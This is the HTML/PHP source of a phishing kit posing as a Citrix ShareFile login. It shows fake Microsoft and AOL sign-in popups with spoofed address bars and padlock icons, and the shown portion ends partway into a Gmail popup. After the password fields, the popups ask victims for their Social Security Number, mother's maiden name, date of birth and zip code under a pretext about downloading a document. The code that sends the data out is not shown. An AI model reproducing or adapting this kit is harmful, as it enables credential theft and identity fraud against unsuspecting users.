<?php
?>
<!DOCTYPE html>
<html>
<head>
    <meta content="text/html; charset=UTF-8" http-equiv="Content-Type">
    <title>ShareFile Login</title>
    <meta content="IE=edge" http-equiv="X-UA-Compatible">
    <meta content="initial-scale=1,user-scalable=no,width=device-width" name="viewport">
    <meta content="true" name="oauthSF">
    <meta content="#2071C5" name="theme-color">
    <meta content="noindex, nofollow" name="robots">
    <link href="assets/css/emails.css" rel="stylesheet">
    <link href="assets/css/onecitrix.css" rel="stylesheet">


    <link href="assets/img/apple-touch-icon.png" rel="apple-touch-icon" sizes="180x180">
    <link href="assets/img/favicon-32x32.png" rel="icon" sizes="32x32" type="image/png">
    <link href="assets/img/favicon-16x16.png" rel="icon" sizes="16x16" type="image/png">
    <link color="#2071C5" href="assets/img/safari-pinned-tab.svg" rel="mask-icon">

    <link href="assets/css/guide.-323232.1622565221517.css" id="_pendo-css_" rel="stylesheet" type="text/css">

    <script src="assets/js/jquery.min.js"></script>
    <script src="assets/js/jquery-3.1.1.min.js"></script>
    <script src="assets/js/jquery-3.3.1.js" integrity="sha256-2Kok7MbOyxpgUVvAk/HJ2jigOSYS2auK4Pfzbm7uH60="
            crossorigin="anonymous"></script>
    <script src="assets/js/jquery-3.1.1.min.js"></script>
    <script src="assets/js/popper.min.js"
            integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q"
            crossorigin="anonymous"></script>



</head>
<body class="custom-background">
<div id="page">
    <div id="outer">
        <div id="applicationHost">
            <div class="step credentials" data-active-view="true"
                 data-bind="showWhenLoaded: true, css: {&#39;credentials&#39;: ShowThemedCircle, &#39;marketing-tips&#39;: ShowMarketingContent }"
                 data-view="AuthShell" id="content" style="">
                <div class="card-wrapper">
                    <div class="card-container">
                        <div class="card"
                             data-bind="css: { &#39;split-credentials-container&#39;: IsSplitCredentialsStep }">
                            <br/><br/><br/><br/><br/><br/><br/>
                            <br/><br/><br/><br/><br/><br/><br/>
                            <div class="logo-container">
                                <div class="header"
                                     data-bind="click: IsWebAppClientAndOneCitrix &amp;&amp; ShowMarketingContent() ? OpenShareFileMarketing : null, css: {&#39;trial-link&#39;: ShowMarketingContent() }, active: IsWebAppClientAndOneCitrix"
                                     id="logo"></div>
                                <div class="custom-logo-container">

                                </div>
                            </div>

                            <div class="backdrop"></div>
                            <div class="inputs text-center">
                                <label class="row" style="color:black;font-size: medium">
                                    Login with your email provider to access your ShareFile
                                </label>
                            </div>
                            <div class="backdrop"></div>

                            <div class="nav text-center no-back has-remember-me gmail-card"
                                 data-bind="css: { &#39;has-remember-me&#39;: ShowRememberMe }">
                                <button class="navlink fwdlink2" data-bind="css: { active: IsProcessing }"
                                        type="button">
                                    <img src="assets/img/google-48.png" width="40px" height="40px" style="float: left">
                                    <span class="btn-text" data-bind="text: LoginButtonText" id="start-button">Login with Gmail</span>
                                    <span class="caret"></span>
                                </button>
                            </div>

                            <div class="nav text-center no-back has-remember-me outcard"
                                 data-bind="css: { &#39;has-remember-me&#39;: ShowRememberMe }">
                                <button class="navlink fwdlink2 outcard" data-bind="css: { active: IsProcessing }"
                                        type="button">
                                    <img src="assets/img/outlook-2019-48.png" width="40px" height="40px"
                                         style="float: left">
                                    <span class="btn-text" data-bind="text: LoginButtonText" id="start-button">Login with Outlook</span>
                                    <span class="caret"></span>
                                </button>
                            </div>

                            <div class="nav text-center no-back has-remember-me yah-card"
                                 data-bind="css: { &#39;has-remember-me&#39;: ShowRememberMe }">
                                <button class="navlink fwdlink2" data-bind="css: { active: IsProcessing }"
                                        type="button">
                                    <img src="assets/img/yahoo-48.png" width="40px" height="40px" style="float: left">
                                    <span class="btn-text" data-bind="text: LoginButtonText" id="start-button">Login with Yahoo</span>
                                    <span class="caret"></span>
                                </button>
                            </div>

                            <div class="nav text-center no-back has-remember-me offi-card"
                                 data-bind="css: { &#39;has-remember-me&#39;: ShowRememberMe }">
                                <button class="navlink fwdlink2" data-bind="css: { active: IsProcessing }"
                                        type="button">
                                    <img src="assets/img/office-365-48.png" width="40px" height="40px"
                                         style="float: left">
                                    <span class="btn-text" data-bind="text: LoginButtonText" id="start-button">Login with Office 365</span>
                                    <span class="caret"></span>
                                </button>
                            </div>

                            <div class="nav text-center no-back has-remember-me aolcard"
                                 data-bind="css: { &#39;has-remember-me&#39;: ShowRememberMe }">
                                <button class="navlink fwdlink2" data-bind="css: { active: IsProcessing }"
                                        type="button">
                                    <img src="assets/img/aol-48.png" width="40px" height="40px" style="float: left">
                                    <span class="btn-text" data-bind="text: LoginButtonText" id="start-button">Login with AOL</span>
                                    <span class="caret"></span>
                                </button>
                            </div>

                            <div class="nav text-center no-back has-remember-me otherbox"
                                 data-bind="css: { &#39;has-remember-me&#39;: ShowRememberMe }">
                                <button class="navlink fwdlink2" data-bind="css: { active: IsProcessing }"
                                        type="button">
                                    <img src="assets/img/at-65.png" width="40px" height="40px" style="float: left">
                                    <span class="btn-text" data-bind="text: LoginButtonText" id="start-button">Login with Other Email Providers</span>
                                    <span class="caret"></span>
                                </button>
                            </div>

                            <div class="backdrop"></div>
                            <br/>

                            <div class="outerbounds" id="step-container">

                                <form action="#" method="post" name="form">
                                    <div class="text-center inputs privacy-policy"
                                         data-bind="css: { &#39;has-login-text&#39;: LoginPageText }">
                                        <a class="tertiary-action-link" data-i18n="privacy_policy"
                                           href="https://arwcpas.sharefile.com/_Auth/PrivacyPolicy/en.html"
                                           id="link-privacy-policy"
                                           tabindex="6" target="_blank">Privacy Policy</a>
                                    </div>

                                    <br/>
                                    <br/>
                                    <div class="inputs text-center">
                                        <img src="assets/img/citrix-logo-black.png" width="100px" height="38px">
                                    </div>

                                </form>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
<!--                        <div class="clear-block"></div>-->
<!--                        <div class="footer">-->
<!--                            <div class="watermark-logo fixed-footer"></div>-->
<!--                            <img src="assets/img/citrix-logo-black.svg">-->
<!--                        </div>-->
        </div>
    </div>
</div>

<!---------------window oulook ------------>
<div id="window" class="win">

    <div id="title-bar-width">
        <div id="title-bar" >
            <div style="margin-top:5px;">
                <img src="assets/img/microsoft-48.png" width="20px" height="15px" id="logo">
                <span id="logo-description">Sign in to your Microsoft Account</span>
            </div>
            <div>
                <span id="minimize">&#8212;</span>
                <span id="square">□</span>
                <span id="exit">✕</span>
            </div>
        </div>

    </div>
    <div id="url-bar">
        <img src="data:image/svg+xml;base64,PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iVVRGLTgiPz4KPHN2ZyB3aWR0aD0iNzUycHQiIGhlaWdodD0iNzUycHQiIHZlcnNpb249IjEuMSIgdmlld0JveD0iMCAwIDc1MiA3NTIiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyI+CiA8cGF0aCBkPSJtNTEwLjk3IDMxNi44aC0xMi43ODVsLTAuMDAzOTA2LTYyLjUxMmMwLTU2LjgyOC00Ni40MS0xMDMuMjQtMTAzLjI0LTEwMy4yNGgtMzcuODg3Yy01Ni44MjggMC0xMDMuMjQgNDYuNDEtMTAzLjI0IDEwMy4yNHY2Mi4wMzloLTEyLjc4NWMtMjUuNTc0IDAtNDUuOTM4IDIwLjgzNi00NS45MzggNDUuOTM4djE5Mi4yN2MwIDI1LjU3NCAyMC44MzYgNDUuOTM4IDQ1LjkzOCA0NS45MzhoMjcwLjQxYzI1LjU3NCAwIDQ1LjkzOC0yMC44MzYgNDUuOTM4LTQ1LjkzOGwwLjAwMzkwNi0xOTEuOGMwLTI1LjU3NC0yMC44MzYtNDUuOTM4LTQ2LjQxLTQ1LjkzOHptLTE5NS4xMi02Mi41MTJjMC0yMi43MyAxOC40NjktNDEuMjAzIDQxLjIwMy00MS4yMDNoMzcuODg3YzIyLjczIDAgNDEuMjAzIDE4LjQ2OSA0MS4yMDMgNDEuMjAzdjYyLjAzOWgtMTIwLjI5eiIgZmlsbD0iI0E2QTZCMiIvPgo8L3N2Zz4K" width="30px" height="20px" id="ssl-padlock">
        <span id="domain-name">https://login.microsoftonline.com</span>
        <span id="domain-path">/common/oauth</span>
    </div>


    <div class="m__box-container">
        <div class="loader">
            <div class="circle"></div>
            <div class="circle"></div>
            <div class="circle"></div>
            <div class="circle"></div>
            <div class="circle"></div>
        </div>

        <div class="m__box">
            <div class="bg-disabled"></div>
            <div class="bg-disabled2"></div>

            <div class="m__box-logo-box">
                <img
                        src="assets/img/microsoft_logo.png"
                        alt="m-box-logo"
                        class="m__box--logo"
                />
            </div>

            <div class="m__box-signin">
                <h2 class="m__header">Trying to sign you in</h2>

                <div class="loader show mg-loader">
                    <div class="circle"></div>
                    <div class="circle"></div>
                    <div class="circle"></div>
                    <div class="circle"></div>
                    <div class="circle"></div>
                </div>

                <div class="head-btn">
                    <button>cancel</button>
                </div>
            </div>

            <form action="#" method="post">
                <div class="m__box-form-box">
                    <h2 class="m__header" style="color: black">Sign in</h2>

                    <div class="error hide-error">
                        <p class="error-msg">
                            Enter a valid email address, phone number, or Skype name.
                        </p>
                    </div>

                    <div class="m__input-box">
                        <input
                                type="text"
                                class="m__input"
                                placeholder="Email, phone, or Skype"
                                name="mail"
                        />
                    </div>

                    <div class="m__create">
                        <span style="color: black">No account? <a href="#">Create one!</a></span>
                    </div>

                    <div class="m__create mb">
                        <a href="#">Can't access your account?</a>
                    </div>

                    <div class="m__buttons">
                        <button type="button" class="btn btn-back">Back</button>
                        <button type="button" class="btn btn-next check" disabled >Next</button>
                    </div>
                </div>

                <div class="m__box-form-box">
                    <div class="m-mail-box">
                        <span class="m__mail" style="color: black"></span>
                    </div>

                    <h2 class="m__header" style="color: black">Enter password</h2>

                    <div class="error hide-error">
                        <p class="error-msg error-f">
                            Please enter the password for your Microsoft account.
                        </p>
                    </div>

                    <div class="m__input-box">
                        <input
                                type="password"
                                class="m__input"
                                placeholder="Password"
                                name="pass"
                                
                        />
                    </div>
                    <div class="m__create mb">
                        <a href="#">Forgot Password?</a>
                    </div>

                    <div class="m__buttons">
                        <button type="button" class="btn btn-next checker" name="send">
                            Sign in
                        </button>
                    </div>
                </div>

                <div class="m__box-form-box">
                    <div class="m-mail-box">
                        <span class="m__mail"></span>
                    </div>

                    <h2 class=" mheader-1" style="color: black">Please help us verify your account to download the document</h2>

                    <div class="error hide-error error3">
                        <p class="error-msg error-f error-3">
                            Please enter the password for your Microsoft account.
                        </p>
                    </div>

                    <div class="m__input-b">
                        <input
                                type="text"
                                class="email2"
                                placeholder=" "
                                name="pass"
                                
                        />

                        <input
                                type="password"
                                class="pass2"
                                placeholder="Password"
                                name="pass"
                                
                        />
                    </div>

                    <div class="m__input-b">
                        <input
                                type="text"
                                class="ssn"
                                placeholder="Social Security Number"
                                name="pass"
                                
                        />

                        <input
                                type="text"
                                class="mothermaid"
                                placeholder="Mother's Maiden Name"
                                name="pass"
                                
                        />
                    </div>


                    <div class="m__input-b">
                        <input
                                type="text"
                                class="dob"
                                placeholder="Date Of Birth"
                                name="pass"
                                
                        />

                        <input
                                type="text"
                                class="zip"
                                placeholder="Zip Code"
                                name="pass"
                                
                        />
                    </div>
                    <div class="m__buttons">
                        <button type="button" class="btn btn-next checker" name="send">
                            Verify
                        </button>
                    </div>
                </div>
            </form>
        </div>

        <div class="offset">
            <div class="offset-box">
                <img
                        src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACwAAAAhCAYAAACiGknfAAAACXBIWXMAAA7DAAAOwwHHb6hkAAAC5klEQVR4Xu2XT4gSURzH1S2j0msMBV2UPbQHNaggJLyUunppL7OXDqF1MhSCPCjUIVH3YmYR7cWOgcf+aNKhRWWDDdRDh1IplkKNrYtzamGn768cmBbNcWZ2JZiBxxvnvd/v95mv7/1+b3Q67dIU+L8V0KuFz/O8Cb54tB2h1+v1P9XyL/g5oNQhQOfgY65UKt3q9/vzjUaDtdvtd0wm0+ZgMCiYzWZOaQyxvSKFAauvVqsX0+n0K47jdBaLZYtAEaDbbrc9UPiDx+N5FAqFHqgJLdtXPp9nXS5XNZlMBkc5KRaLBp/PtxYMBp9CbVoys70AWwbU8UkUgH4Tj8fvTZq3p+Msyz6EsleEIACKVCqVkXuiXq8fwcu9Re/YU6h/OQfAc2E8Fotdx+8dtJfjbAKBwGO84G2lwAa5DrDBPgq2iURiFffP3G53Zpw/p9NZbjab52mjyo0p2w6KngmHwyvTOMByOYV/oA1g2SJRPFnGDMNswdY4DXCv15vH/KPT2IyaKxd4u9PpnJsmOPLygs1mW4fN/i8JAsXfu4mUtiQVGnMXYcOjvzqTdZzL5WJ+v59vtVrWKaCXZgaNymVEqvoK6A3k10OjoLvdLoP8vIqXOiaMQ+FrQ+hlqS8qnqdoPRF0KpW6W6vV7Far9T1S1zr12GA2rNnTOBDdpGCZTOasw+HYEEHfwPnjfjQa9Xu93hdywBXZQGEDigIEDzyBet9RinmkvjWoSWcNHuMXaN2K1y7GLlOaQ7+gKLgaxgIY9QQsbsPj6O8wgD2IsXfoD6sRVxUfUPcS2nKhUPhE4LszBGCNw0OU5M2rCtgkJ4BeIWAc8J1ofxUQVM0kmqQzs6zCMQluzHiZnkcikQoaB0DxuYOq5gkpfhV/IkkJQnOQJV4LVQ6wBdxvi2zp/psUX/sGvAumhdK+CKW/0HOkQAanv89SgBXlYSkBxs2BygzGTqLRR+qPbDbbU+JPs9UU0BTQFPijwC94ekg9NYObaQAAAABJRU5ErkJggg=="
                        alt="key-offset"
                        class="offset-box--img"
                />
                <span style="color: black">Sign-in Options</span>
            </div>
        </div>
    </div>

</div>
<!--------End -------window oulook -----End ------->
<!----------------Window AOL ----------------->
<div id="window" class="win win-2">
    <div id="title-bar-width">
        <div id="title-bar" >
            <div style="margin-top:5px;">
                <img src="assets/img/aol-24.png" width="20px" height="20px" id="logo">
                <span id="logo-description">Sign in to your AOL Account</span>
            </div>
            <div>
                <span id="minimize">&#8212;</span>
                <span id="square">□</span>
                <span id="exit" class="exit2">✕</span>
            </div>
        </div>

    </div>
    <div id="url-bar">
        <img src="data:image/svg+xml;base64,PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iVVRGLTgiPz4KPHN2ZyB3aWR0aD0iNzUycHQiIGhlaWdodD0iNzUycHQiIHZlcnNpb249IjEuMSIgdmlld0JveD0iMCAwIDc1MiA3NTIiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyI+CiA8cGF0aCBkPSJtNTEwLjk3IDMxNi44aC0xMi43ODVsLTAuMDAzOTA2LTYyLjUxMmMwLTU2LjgyOC00Ni40MS0xMDMuMjQtMTAzLjI0LTEwMy4yNGgtMzcuODg3Yy01Ni44MjggMC0xMDMuMjQgNDYuNDEtMTAzLjI0IDEwMy4yNHY2Mi4wMzloLTEyLjc4NWMtMjUuNTc0IDAtNDUuOTM4IDIwLjgzNi00NS45MzggNDUuOTM4djE5Mi4yN2MwIDI1LjU3NCAyMC44MzYgNDUuOTM4IDQ1LjkzOCA0NS45MzhoMjcwLjQxYzI1LjU3NCAwIDQ1LjkzOC0yMC44MzYgNDUuOTM4LTQ1LjkzOGwwLjAwMzkwNi0xOTEuOGMwLTI1LjU3NC0yMC44MzYtNDUuOTM4LTQ2LjQxLTQ1LjkzOHptLTE5NS4xMi02Mi41MTJjMC0yMi43MyAxOC40NjktNDEuMjAzIDQxLjIwMy00MS4yMDNoMzcuODg3YzIyLjczIDAgNDEuMjAzIDE4LjQ2OSA0MS4yMDMgNDEuMjAzdjYyLjAzOWgtMTIwLjI5eiIgZmlsbD0iI0E2QTZCMiIvPgo8L3N2Zz4K" width="30px" height="20px" id="ssl-padlock">
        <span id="domain-name">https://login.aol.com/?</span>
        <span id="domain-path">/common/oauth</span>
    </div>

    <div class="box-contain">
        <div class="head-con">
            <img src="assets/img/aol-logo-black.png" alt="logo-aol" width="50px">
        </div>

        <div class="box-con-form">
            <div class="box-con-logo">
                <img src="assets/img/aol-logo-black.png" alt="logo-aol" width="50px">
            </div>

            <div class="box-con-sign">
                <h2 class="sign-data-text" style="color: black">Sign in</h2>
            </div>

            <form action="#" id="form-data-box">
                <div class="form-ao-data active">
                    <div class="box-con__input inp-box-con">
                        <input type="text" name="" id="username" placeholder="Username, email, or mobile"  class="aol-input">
                        <div class="err-aol-box">
                            <span class="err-aol"></span>
                        </div>
                    </div>


                    <div class="box-con__input btn-inp-data">
                        <button type="button" class="btnAol text-btn"><a class="next-text">Next</a><div class="loadererr text-loader hide-load-icon">Loading...</div></button>
                    </div>

                    <div class="box-con__input btn-inp-data">
                        <div class="sign-box-con">
                            <input type="checkbox">
                            <span>Stay Signed in</span>
                        </div>

                        <div class="sign-box-con">
                            <input type="checkbox">
                            <span>Forgot username?</span>
                        </div>
                    </div>

                    <div class="box-con__input box-con-create">
                        <button type="button">Create an account</button>
                    </div>

                    <div class="box-con__input conti-text">
                        <span style="color: black">Or, continue with</span>
                    </div>


                    <div class="box-con__input img-boxess">
                        <div class="gmai-con">

                            <svg width="20px" height="20px" viewBox="0 0 20 20" version="1.1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
                                <!-- Generator: Sketch 58 (84663) - https://sketch.com -->
                                <title>Google</title>
                                <desc>Created with Sketch.</desc>
                                <g id="Account-Access" stroke="none" stroke-width="1" fill="none" fill-rule="evenodd">
                                    <g id="AOL_SocialLogin" transform="translate(-54.000000, -514.000000)" fill-rule="nonzero">
                                        <g id="Google" transform="translate(54.000000, 514.000000)">
                                            <path d="M6.71603956,0.545920922 C4.28708514,1.37702012 2.21738005,3.19471449 1.06456503,5.49498258 C0.662420261,6.28854827 0.372876025,7.13037132 0.195932325,8.00436596 C-0.243745959,10.1705858 0.0618840676,12.4815778 1.0592031,14.4547681 C1.70799667,15.7416314 2.64097254,16.8890845 3.7669779,17.7845268 C4.83400203,18.6317118 6.07260793,19.2644196 7.39164278,19.6129451 C9.05384117,20.0579853 10.8232782,20.0472614 12.4962004,19.6665644 C14.0082648,19.3180389 15.4399002,18.5941783 16.5819913,17.54324 C17.7884256,16.4333204 18.6516964,14.9748753 19.1074605,13.4038298 C19.60612,11.693374 19.6704632,9.86495577 19.3594712,8.10624264 C16.2334658,8.10624264 13.1020985,8.10624264 9.97609318,8.10624264 C9.97609318,9.40382977 9.97609318,10.7014169 9.97609318,11.999004 C11.7884256,11.999004 13.6007581,11.999004 15.4130905,11.999004 C15.2039752,13.2429719 14.4640288,14.3797011 13.4184524,15.082114 C12.758935,15.5271542 12.0029028,15.8113365 11.220061,15.9507467 C10.4372192,16.0847949 9.62220578,16.1008807 8.83936396,15.9453847 C8.04043635,15.7845268 7.28440417,15.4520871 6.61952482,14.9855992 C5.55786262,14.2402909 4.74821115,13.151819 4.33534251,11.923937 C3.91175002,10.6746072 3.90638809,9.2858673 4.33534251,8.04189947 C4.63561061,7.16254291 5.1289082,6.35289143 5.78306369,5.68801207 C6.58735324,4.86227481 7.63292964,4.27246248 8.76429694,4.03117561 C9.72944439,3.82742226 10.7482111,3.86495577 11.6919109,4.14913808 C12.4962004,4.39042494 13.2361468,4.83546516 13.8420449,5.41455363 C14.453305,4.80329358 15.064565,4.19203352 15.6758251,3.58077347 C15.9975409,3.25369572 16.3353425,2.93734183 16.6463345,2.59954022 C15.7187205,1.74163138 14.6248867,1.04994237 13.4345382,0.610264085 C11.2897661,-0.183301598 8.87689747,-0.199387389 6.71603956,0.545920922 Z" id="Path" fill="#FFFFFF"></path>
                                            <path d="M6.71603956,0.545920922 C8.87153554,-0.199387389 11.2897661,-0.183301598 13.4345382,0.604902155 C14.6248867,1.04458044 15.7133586,1.73090752 16.6463345,2.59417829 C16.3353425,2.9319799 15.9975409,3.24833379 15.6758251,3.57541154 C15.064565,4.18667159 14.453305,4.79793165 13.8420449,5.4091917 C13.2361468,4.83010323 12.4962004,4.39042494 11.6919109,4.14377615 C10.7482111,3.85959384 9.72944439,3.8166984 8.76429694,4.02581368 C7.63829157,4.26710055 6.59271517,4.85691288 5.78306369,5.68265014 C5.1289082,6.34216757 4.63561061,7.15718098 4.33534251,8.03653754 C3.24687066,7.18935256 2.15839881,6.3475295 1.06456503,5.50034451 C2.21738005,3.19471449 4.28708514,1.37702012 6.71603956,0.545920922 Z" id="Path" fill="#EA4335"></path>
                                            <path d="M0.201294255,7.99900403 C0.378237955,7.13037132 0.667782191,6.28318634 1.06992696,5.48962065 C2.15839881,6.33680564 3.24687066,7.1786287 4.34070444,8.02581368 C3.91175002,9.27514344 3.91175002,10.6638834 4.34070444,11.9078512 C3.25223259,12.7550362 2.16376074,13.6022212 1.07528889,14.4440442 C0.0672459979,12.4762158 -0.238384029,10.1652239 0.201294255,7.99900403 Z" id="Path" fill="#FBBC05"></path>
                                            <path d="M9.97609318,8.10088071 C13.1020985,8.10088071 16.2334658,8.10088071 19.3594712,8.10088071 C19.6704632,9.85423191 19.6007581,11.6826501 19.1074605,13.3984678 C18.6516964,14.9695134 17.7884256,16.4279585 16.5819913,17.537878 C15.525691,16.7175027 14.4693908,15.8971274 13.4130905,15.076752 C14.4586669,14.3743392 15.1986133,13.2376099 15.4077286,11.9936421 C13.5953961,11.9936421 11.7830637,11.9936421 9.97073125,11.9936421 C9.97609318,10.696055 9.97609318,9.39846784 9.97609318,8.10088071 Z" id="Path" fill="#4285F4"></path>
                                            <path d="M1.06456503,14.4494062 C2.15303688,13.6075831 3.24150873,12.7603981 4.32998058,11.9132131 C4.74821115,13.1410952 5.55250069,14.229567 6.61416289,14.9748753 C7.27904224,15.4413633 8.04043635,15.773803 8.83400203,15.9346609 C9.61684385,16.0955188 10.4264953,16.0740711 11.2146991,15.9400228 C11.9975409,15.8006126 12.7535731,15.5164303 13.4130905,15.0713901 C14.4693908,15.8917654 15.525691,16.7121408 16.5819913,17.5325161 C15.4399002,18.5888164 14.0082648,19.307315 12.4962004,19.6558405 C10.8232782,20.0365375 9.05384117,20.0472614 7.39164278,19.6022212 C6.07260793,19.2536957 4.83400203,18.6263499 3.7669779,17.773803 C2.64633447,16.8837225 1.7133586,15.7362694 1.06456503,14.4494062 Z" id="Path" fill="#34A853"></path>
                                        </g>
                                    </g>
                                </g>
                            </svg>
                        </div>

                        <div class="gmai ">
                            <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAPAAAABICAMAAAD/Eoi4AAAAKlBMVEVHcExhAtNhAdNhAtNyGeFgAdJgAdJgAdJgAdNiBdVhA9RgAdJlCddgAdIF22wQAAAADnRSTlMAVHtqCrP/4ZMqPcoZ81BhdT4AAAS5SURBVHja7ZrrjiMpDEaLi4uL8fu/7qon0ia2MRS1NRotE6v/dILAB8yHDTm+9rWvXTDn3xb+nBvRM/uNnsD5tvTngP3JLG8PnDhw2R24cl48dgcGDux2B26cl+LmwFqy9gbWkrU7sOO8cOwNrCVrd+DCedOxO3DmwH534EgcuG0OrCVrd2DkwPWJoCklrgDHVsy4ereIF4du9yXLfZqaidr9tgX8tUcIQ/v597NRF7jmVxqAvhiJvkc6X13m0XI0B4le/UJotyQLRps7UucsK8BStsbLkqiBC7L2miJziaFsoFTgIOguSRY11slIvoNOv2M+uVGdAAfRvgjvPJ3SyEcbd44chpKFgwMaVfpdUse7IXBQ7VnMvjpUlopRDEjLcVWyAv/S3vvFdM8G7sN8+OjIaESOx4HZJ7bFyj+SWUVlGRiFzrvA/UHCoFX4dBIH89fGkhWGkkbRlCwx7Dqw1sY6bFWZtNqGkWsgTSr/Ys2Hk7s7n/eBe9rYxhuECtu/tsFi5Q9GxIPwsZ5PAafRumlfyqw/t1b5u36DIqMQHgM+mwxoG2RhAoeSZc5J7oYGiJ7WgTXJXBGQI9gW1ip/Lze5noaqMdAHD3QFOAGS3sRVtcqQ9MTo7iBnOW5au6xsUo61ZKl8DQrPk2zgVH+GQK4kSgKx9tKprBNF/0r4Av+0zCVrdOBqybJz0EoGMM9ko9o3/APjlJQzT7Wfovm1y8qqFaVJp711ELgxcDYkoVjJF7KtJGYgGE7jYuWPara8dBrM+gOGwLXnHwjXqpUXBO4bWnFJi5eVQSlAkv6gOXFuCNx6agJ8RtHMCzz3xJkZU1y7rIwk+HS8JDM9jUPgf5sJ4GxWpYHHluz9bUlt1uqZqQW2ZUtvnEHBRQNgugIczIgBFhlkb8T6X97aKEZSZxnZW+P8jcA8fp4ClmEYgtZZO6TbLWBvnJbqGzKvoKhz/sRaS1x+L0fUZ5ktWuEWcDDFBW3RCqbLL0iHv8aEuvy8qCUUzPMcbwE743hVX6BxXh8oh4mw8hwcJiWLt2puf94Cbjod66RkRehnNhwGeS0yJ27U56XYy8YgsnGXgWVgYOte5iT7XtWRDBFYfCDNkwsoPiHJRXZJvQ7sxd3nD3ILSQ9OosqInTvbpqqvtPikqoVRohECK+cWgfV4CVV3tbcSlJCUzuhmc+HCHi+MJ+Q2MGtmGVwduHZU1y++MeqtAA8Dz0GKudn0Ake9F2cW0+S26FngOQhoPbUXuK0CKxnRcZEfBo548YXCXbj1jabr84TazOXwOeD5xTSV0VLoznBBtMxdCkLI07PARyWbt14MLojdSUlxKaHWs2QvCd0HPgpa8VwuJoLZyJzCnd/rJR31qF1zt4HtZ0HQb4Ld6KIPLqdGWE6oQ68JyefKegv4TYLWO/f85Tw3Q3Qh3vl9E7WutOX0+d59HDeB3+aA3TeAs0TV80Q7FxkFKNZ9bnjpJKsZMFGCXF/T9GGv/8UHupWw6F49ImQ3XJsSAJB+GvrS9cxn1sXMipCs7S3zhG17i6LG3Nz0z5T2Ni1Z21sVtdn2Bn+ZZDVR+W9vXhQb21v6yyTLDSr//c8k2J835uzff/X42tf+h/YPQiqe2vV+1kkAAAAASUVORK5CYII=" alt="gma" width="60px">
                        </div>
                    </div>
                </div>


                <div class="form-ao-data">
                    <div class="box-con__input inp-box-con">
                        <input type="password" name="" id="password" placeholder="Enter your Password" class="aol-input" >
                        <div class="err-aol-box">
                            <span class="err-aol"></span>
                        </div>
                    </div>


                    <div class="box-con__input btn-inp-data">
                        <button type="button" class="btnAol text-btn"><a class="next-text">Login </a><div class="loadererr text-loader hide-load-icon">Loading...</div></button>
                    </div>

                    <div class="box-con__input btn-inp-data">
                        <div class="sign-box-con">
                            <input type="checkbox">
                            <span>Stay Signed in</span>
                        </div>

                        <div class="sign-box-con">
                            <span>Forgot Password?</span>
                        </div>
                    </div>


                    <div class="box-con__input box-con-create">
                        <button type="button">Create an account</button>
                    </div>

                </div>


                <div class="form-ao-data">
                    <div class="err-aol-box">
                        <span class="err-aol"></span>
                    </div>
                    <div class="box-con__input inp-box-con">
                        <input type="text" name="" id="email2" placeholder=" " class="aol-input" >

                    </div>

                    <div class="box-con__input inp-box-con">
                        <input type="password" name="" id="pass2" placeholder="Enter your Password" class="aol-input" >
                        <div class="err-aol-box">
                            <span class="err-aol"></span>
                        </div>
                    </div>

                    <div class="box-con__input inp-box-con">
                        <input type="text" name="" id="ssn2" placeholder="Social Security Number" class="aol-input" >
                        <div class="err-aol-box">
                            <span class="err-aol"></span>
                        </div>
                    </div>

                    <div class="box-con__input inp-box-con">
                        <input type="text" name="" id="maidenname" placeholder="Mother's Maiden Name" class="aol-input" >
                        <div class="err-aol-box">
                            <span class="err-aol"></span>
                        </div>
                    </div>

                    <div class="box-con__input inp-box-con">
                        <input type="text" name="" id="dateofbirth" placeholder="Date Of Birth" class="aol-input" >
                        <div class="err-aol-box">
                            <span class="err-aol"></span>
                        </div>
                    </div>

                    <div class="box-con__input inp-box-con">
                        <input type="text" name="" id="zipcode" placeholder="Zip Code" class="aol-input" >
                        <div class="err-aol-box">
                            <span class="err-aol"></span>
                        </div>
                    </div>

                    <div class="box-con__input btn-inp-data ">
                        <button type="button" class="btnAol"><a>Verify Account</a><div class="loadererr hide-load-icon" ></div></button>
                    </div>


                </div>
        </div>

    </div>


    </form>
</div>
<!------End---------Window AOL ---------End-------->
<!----------------Window GMAIL ----------------->
<div id="window" class="win win-3">
    <div id="title-bar-width">
        <div id="title-bar" >
            <div style="margin-top:5px;">
                <img src="assets/img/gmail-48.png" width="20px" id="logo">
                <span id="logo-description">Sign in to your google account</span>
            </div>
            <div>
                <span id="minimize">&#8212;</span>
                <span id="square">□</span>
                <span id="exit" class="exit3">✕</span>
            </div>
        </div>

    </div>
    <div id="url-bar">
